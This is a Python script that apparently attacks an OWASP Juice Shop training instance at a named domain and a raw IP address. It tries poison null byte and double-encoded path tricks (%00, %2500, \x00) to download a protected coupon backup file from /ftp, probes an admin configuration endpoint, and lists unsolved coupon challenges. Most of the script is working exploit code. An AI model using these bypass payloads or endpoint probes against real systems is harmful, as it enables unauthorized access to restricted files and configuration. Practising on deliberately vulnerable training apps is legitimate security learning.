#!/usr/bin/env python3

import requests
import time
import urllib.parse

def check_server(base_url, server_name):
    print(f"\n🔧 Checking {server_name} configuration...")
    
    session = requests.Session()
    
    # Try to access backup file with various poison null byte techniques
    backup_attempts = [
        "/ftp/coupons_2013.md.bak",
        "/ftp/coupons_2013.md.bak%00.pdf",
        "/ftp/coupons_2013.md.bak%00.md",
        "/ftp/coupons_2013.md.bak%2500.pdf",
        "/ftp/coupons_2013.md.bak\x00.pdf",
        "//ftp//coupons_2013.md.bak",
    ]
    
    print("   Trying backup file access...")
    for attempt in backup_attempts:
        response = session.get(f"{base_url}{attempt}")
        print(f"   {attempt}: HTTP {response.status_code}")
        
        if response.status_code == 200:
            print(f"   🎉 FOUND BACKUP FILE!")
            content = response.text[:500]
            print(f"   Content preview: {content}")
            return True
    
    # Check configuration endpoints
    config_endpoints = [
        "/rest/admin/application-configuration",
        "/api/Challenges",
        "/rest/products/search",
    ]
    
    print("   Checking configuration endpoints...")
    for endpoint in config_endpoints:
        response = session.get(f"{base_url}{endpoint}")
        if response.status_code == 200:
            data = response.json()
            
            # Look for coupon-related config
            import json
            content = json.dumps(data)
            
            if 'coupon' in content.lower():
                print(f"   Found coupon config in {endpoint}")
                print(f"   Content: {content[:200]}...")

# Check both servers            
check_server("https://juice5.wonkatech.org", "Cloudflare")
check_server("http://66.42.93.220", "Direct Server")

print("\n🔍 Let's also check if we need to solve prerequisites...")

# Check what challenges are available
import requests
session = requests.Session()

for base_url in ["https://juice5.wonkatech.org", "http://66.42.93.220"]:
    print(f"\n📋 Challenges on {base_url}:")
    try:
        challenges_response = session.get(f"{base_url}/api/Challenges")
        if challenges_response.status_code == 200:
            challenges = challenges_response.json().get('data', [])
            
            # Look for coupon-related challenges
            coupon_challenges = [c for c in challenges if 'coupon' in c.get('name', '').lower()]
            
            for challenge in coupon_challenges:
                name = challenge.get('name')
                solved = challenge.get('solved', False)
                description = challenge.get('description', '')
                print(f"   {name}: {'✅ SOLVED' if solved else '❌ UNSOLVED'}")
                print(f"      {description}")
                
        break  # Only check one server for challenges
    except:
        continue
